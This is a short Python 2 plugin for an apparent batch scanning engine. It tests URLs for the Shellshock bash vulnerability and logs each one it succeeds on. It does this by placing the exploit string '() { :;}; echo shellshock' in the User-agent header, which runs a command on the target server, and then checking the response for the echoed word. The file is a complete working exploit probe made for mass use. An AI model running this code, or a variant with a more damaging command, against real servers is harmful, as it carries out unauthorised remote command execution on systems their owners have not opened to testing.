import httplib, urllib2
from task import engine_plugin

class shellshock_plugin(engine_plugin):
    def __init__(self, name):
        engine_plugin.__init__(self, name)
    
    def handle_task(self, task_info):
        url = task_info['work'].strip()
        
        try:
            request = urllib2.Request(url)
            request.add_header('User-agent', '() { :;}; echo shellshock')
        
            response = urllib2.urlopen(request, timeout=10)
            html = response.read()
            if 'shellshock' in html:
                self.log(task_info, "%s\tSUCCESS" % url)
                
        except Exception,e:
            #print e
            pass
    
def init_plugin(name):
    return shellshock_plugin(name)